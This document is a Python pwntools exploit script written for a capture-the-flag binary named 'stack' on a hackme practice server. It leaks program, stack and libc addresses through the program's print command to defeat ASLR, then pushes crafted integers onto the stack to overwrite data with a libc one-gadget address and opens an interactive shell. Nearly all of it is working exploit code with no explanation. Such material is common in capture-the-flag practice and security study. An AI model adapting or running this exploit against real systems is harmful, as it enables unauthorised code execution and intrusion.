from pwn import *
import sys, os
import ctypes as ct

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0

localMAGIC = 0x0003AC69      #locallibc
remoteMAGIC = 0x0003AC49      #remotelibc

context(arch='i386', os='linux', log_level='debug')

def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr = 0):
    global mypid
    mypid = proc.pidof(r)[0]
    raw_input('debug:')
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(r, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))


def tohex(val, nbits):
    return hex((val + (1 << nbits)) % (1 << nbits))

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

#r = process('/home/h11p/hackme/stack')

r = remote('hackme.inndy.tw', 7716)

elf = ELF('/home/h11p/hackme/stack')
print "bss:"+hex(elf.bss())
print "puts_addr:"+hex(elf.plt["puts"])

#debug(addr=0x0715)

MAGIC_addr=0x0
stack_addr=0x0

r.recvuntil('Cmd >>\n')
r.sendline('i')
r.sendline('1234')
r.recv()
for i in xrange(0,15):
    r.sendline("p")
    myrecv=r.recv()

    if i==4:
        print str(i)+":",
        prog_addr=tohex(int(myrecv.splitlines()[0][7:]),32)
        print prog_addr
        base_module=hex(base_addr(prog_addr,0x75a))
        print "elf_addr:"+base_module
    elif i==7:
        print str(i) + ":",
        stack_addr = tohex(int(myrecv.splitlines()[0][7:]), 32)
        print "stack_addr:"+stack_addr
    elif i==13:
        print str(i) + ":",
        scanf_addr=tohex(int(myrecv.splitlines()[0][7:]), 32)
        print scanf_addr
        scanf_base_addr=hex(base_addr(scanf_addr,0xb))
        print "scanf_base_addr:"+scanf_base_addr

        # remotelibc
        libc_module = hex(base_addr(scanf_addr, 0x05bfeb))
        print "libc_module:" + libc_module
        MAGIC_addr = eval(libc_module) + remoteMAGIC
        print "MAGIC_addr:" + hex(MAGIC_addr)
        print "MAGIC_addr_10:",
        print ct.c_int32(MAGIC_addr).value


        '''
        #locallibc
        libc_module = hex(base_addr(scanf_addr, 0x5c0cb))
        print "libc_module:" + libc_module
        MAGIC_addr=eval(libc_module)+localMAGIC
        print "MAGIC_addr:"+hex(MAGIC_addr)
        print "MAGIC_addr_10:",
        print ct.c_int32(MAGIC_addr).value
        '''

for j in xrange(0,6):
    print "this is:"+str(j)
    r.sendline('i')
    #r.sendline(str(ct.c_int32(eval(stack_addr)).value))
    r.sendline(str(ct.c_int32(eval(stack_addr)+0x160).value))
    r.recv()

r.sendline('i')
#r.sendline(str(ct.c_int32(eval(stack_addr)).value))
r.sendline(str(ct.c_int32(MAGIC_addr).value))
#r.recv()

r.interactive()
